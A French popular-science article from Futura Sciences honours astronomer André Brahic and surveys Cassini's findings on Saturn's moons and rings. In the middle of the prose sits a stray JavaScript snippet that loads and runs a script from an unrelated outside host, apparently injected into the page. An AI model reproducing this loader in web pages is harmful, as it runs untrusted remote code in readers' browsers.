{"title": "À bord de Cassini autour de Saturne avec André Brahic", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "26/09/2011", "content": "Après l'immense succès de la longue mission Cassini-Huygens, il est juste de rendre hommage à André Brahic, l'un de ses ardents défenseurs et qui a travaillé pour l'équipe d'imagerie. En 2011, Futura l'avait interrogé sur ce thème et ses réponses, six ans plus tard, sont toujours instructives. En juin 1980, la sonde  Voyager 1  est sur le point d'arriver aux abords de  Saturne . Devant le succès déjà remporté par Voyager avec l'exploration de  Jupiter ,  André Brahic  et quelques-uns de ses collègues réfléchissent déjà à la prochaine étape, c'est-à-dire la mise en  orbite  d'une sonde autour de Saturne après les  survols  de Voyager 1 et 2. Toutefois, tous ne sont pas enthousiastes, pensant que le projet est trop ambitieux et trop coûteux. Comme il est raconté dans l'ouvrage  De  feu  et de glace, planètes ardentes ,  André Brahic  apostrophe ses collègues un peu frileux en leur disant : «  dans la vie, il suffit de dire qu'une chose est impossible pour qu'elle le devienne  ». Il faudra tout de même dix ans pour que Nasa et ESA se mettent d'accord pour construire la sonde Cassini qui sera lancée en 1997. La mission elle-même aura coûté environ 4 milliards de dollars, c'est-à-dire presque aussi cher que la construction du  LHC .  Les membres de l'équipe d'imagerie de la mission Cassini de gauche à droite : Joe Burns, Torrence Johnson, Alfred McEwen, Carl Murray, Bob West, Joe Veverka, Peter Thomas, André Brahic. En bas et toujours de gauche à droite : Tony DelGenio, Andy Ingersoll, Carolyn Porco, Steve Squyres, Luke Dones (manquant sur la photo : Gerhard Neukum). © N.A.S.A.-JPL                               André Brahic est bien sûr sélectionné dans l'équipe d'imagerie de la mission Cassini. Il en fait toujours partie et comme la mission a été prolongée jusqu'en 2017, le chercheur compte bien travailler encore longtemps. Il milite donc pour la suppression de la retraite, comme il le déclare malicieusement dans la vidéo d'une conférence qu'il a donnée à l'École normale supérieure pour les Ernest.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Une sonde à 1 h 30 lumière de la Terre Pour l'heure, le chercheur continue à étudier les images en provenance de Cassini. Il s'agit d'un très lourd travail car des semaines et parfois des mois de traitement sont souvent nécessaires pour extraire l'information scientifique à partir des données brutes transmises par la sonde. Les plus belles images sont disponibles sur le site  Cassini Imaging Central Laboratory for Operations  ( CICLOPS ) de l'équipe d'imagerie de Cassini. Prendre ces données est loin d'être une sinécure. La sonde se trouve à environ 1 h 30  lumière  de la  Terre  et la transmission d'instructions ne suffit pas pour que la sonde exécute des opérations réglées au quart de seconde près. Il faut en effet attendre que la sonde confirme qu'elle a correctement reçu son programme à effectuer avant que les ingénieurs du  JPL  ne lui donnent l'ordre de le faire. Il s'écoule donc à chaque fois pas loin de 4 h 30.  Une conférence sur les anneaux de Saturne à l'École normale supérieure par André Brahic © Les Ernest/Dailymotion Pas loin d'un million d'images, dont toutes ne sont pas spectaculaires, ont été prises par Cassini. On trouve les plus belles dans la section  Imaging Diary  du site de  Ciclops . Quand vous lisez les légendes associées, sachez que l'un des auteurs n'est autre qu'André Brahic lui-même. Ce sont d'ailleurs certaines de ces images que vous pouvez retrouver dans son livre. L'ouvrage est très à jour puisque l'on y retrouve les images de la récente collision d'astéroïdes observée par  Hubble . Des geysers s'échappant du pôle sud d'Encelade. © Nasa, JPL                               Plus de soixante  lunes  ont été découvertes autour de Saturne. La plus grosse,  Titan , possède une  atmosphère  d'azote comme la Terre avec une pression au sol proche de la  pression atmosphérique  terrestre, mais une température de - 200 °C. Des rivières de méthane coulent au milieu de la glace d'eau et alimentent des  lacs  de méthane. Des  nuages  de méthane et des pluies de méthane surmontent le paysage. L'éthane, le propane et de nombreux  hydrocarbures  sont aussi présents sur  Titan . Mais la lune la plus étonnante,  Encelade , occupe une place à part. Les énigmatiques Encelade et Japet Étant donnée sa petite taille, il était difficile d'imaginer que ce satellite puisse être actif. André Brahic et ses collègues ont pourtant découvert qu'un important  cryovolcanisme  existait sous la forme de véritables  geysers  au niveau du pôle sud d'Encelade. Sa surface peu cratérisée montre aussi qu'il s'agit d'un monde actif, des chercheurs comme  Julie Castillo  ont donc proposé des théories pour expliquer cette activité.  Encelade est vraiment une petite lune de Saturne comme on peut le voir sur cette image donnant l'échelle de sa taille en comparaison avec les îles britanniques. Expliquer d'où elle tire l'énergie qui la rend active n'est pas une mince affaire. © Nasa, JPL                               Pour expliquer la source d' énergie  d'Encelade, on fait intervenir les considérables effets de  marées  de Saturne, les perturbations des autres satellites, la  radioactivité  et la présence d'une mer souterraine composée d'eau  liquide . De la vapeur d'eau s'échappe des geysers d'Encelade, mais de nombreuses  molécules  organiques ont aussi été détectées. Les trois composants nécessaires à la vie, à savoir de l'énergie, une chimie complexe et de l' eau liquide , sont présents sur Encelade. Cela ne signifie pas que la vie existe dans les mers souterraines, mais nous pourrions y trouver l'un des  chaînons manquants  entre le monde inanimé et le monde vivant. C'est pourquoi la Nasa et l'ESA espèrent un retour vers Europe et Encelade dans les années 2020. Nous aurons alors une pensée pour  Arthur Clarke  qui a mis en scène dans son célèbre roman,  2010 : Odyssée 2 , la découverte d'une forme de vie sur Europe. Une vue de Japet, l'une des lunes les plus mystérieuses de Saturne en raison de son bourrelet équatorial et de ses deux faces, l'une blanche, l'autre sombre. © Nasa, JPL                               L'autre curiosité qui vient à l'esprit après Titan et Encelade, quand on parle des lunes de Saturne, est bien évidemment  Japet  avec sa peau de dalmatien et son bourrelet équatorial. Plusieurs explications ont été proposées pour expliquer ces énigmes. La plus probable pour l'existence d'une face sombre et d'une face blanche, et que mentionne André Brahic dans son livre, est que le  matériau  noir, composé de molécules organiques, provient d'un tore de poussière qui entoure Saturne. Il ne s'agirait pas d'un dépôt de  matières  internes éjectées par des éruptions passées. Une autre vue de Japet prise lors d'un survol par la sonde Cassini. Le bourrelet équatorial est bien visible. © Nasa, JPL                               Les  anneaux de Saturne  sont en eux-mêmes passionnants, non seulement en raison de leur beauté, mais aussi par la richesse et la variété des phénomènes qu'ils exhibent. Les autres  planètes géantes  sont elles aussi pourvues d'anneaux riches et variés. Avec la mission Cassini, les  anneaux de Saturne  sont devenus d'extraordinaires laboratoires de  physique  permettant d'étudier de multiples problèmes afin d'essayer de mieux comprendre les processus d' accrétion , l'effet des  résonances , le confinement gravitationnel, de multiples variétés d'ondes et de perturbations. Alors que les ondes spirales des  galaxies  mettent des centaines de millions d'années pour effectuer une révolution, on peut suivre celles des anneaux de Saturne en quelques jours ! Ces anneaux devraient permettre de mieux comprendre les disques lointains dans l'espace (tels que les disques circumstellaires ou les galaxies) ou lointains dans le temps (comme le  disque protoplanétaire  qui a donné naissance à la Terre et à ses voisines). Les arcs de matière confinée gravitationnellement de Neptune découverts en 1984 sur Terre par André Brahic à l'occasion d'une occultation d'étoile et observés ici par Voyager. © Nasa, JPL                               De manière tout à fait inattendue, les processus de confinement gravitationnel des arcs de  Neptune  et de Saturne nous ont conduits à un autre problème de physique. Les arcs planétaires sont confinés par les interactions gravitationnelles de petits satellites voisins. Les phénomènes de résonance, les collisions et les perturbations jouent un rôle important dans ce phénomène. Dans un contexte complètement différent, les Hommes tentent de confiner de la matière dans de forts  champs magnétiques  pour pouvoir démarrer des réactions de  fusion  et enfin résoudre le problème de l'énergie. Dans les deux cas, des  équations  de Fokker-Planck, du nom des physiciens qui les ont écrites, permettent de décrire les phénomènes. Ces équations n'ont pas de solution analytique et des centaines de physiciens tentent de les résoudre au prix de multiples approximations. Voila qui montre bien l'universalité de la physique. Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  titan lune de saturne  |  saturne anneaux  |  definition de lune de saturne  |  sonde cassini  |  sonde cassini huygens  |  voir anneaux de saturne  |  ovni dans anneaux de saturne  |  decouverte de saturne  |  tourne autour de saturne  |  diametre de saturne", "theme": "sciences"}